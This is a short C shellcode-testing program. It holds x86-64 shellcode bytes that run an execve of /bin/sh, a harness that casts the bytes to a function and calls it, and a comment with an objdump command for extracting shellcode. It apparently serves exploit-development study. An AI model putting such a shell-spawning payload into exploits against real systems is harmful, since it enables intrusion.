// To extract shellcode use the bellow command
// $ for i in $(objdump -d helloworld |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo 


#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\xeb\x10\x5f\x57\x48\x89\xe6\x48\x31\xc0\x50\x48\x89\xe2\xb0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


int main()
{
	printf("Shellcode length : %d \n", (int )strlen(code));	

	int  (*ret)() = (int (*)())code; 

	ret();
}
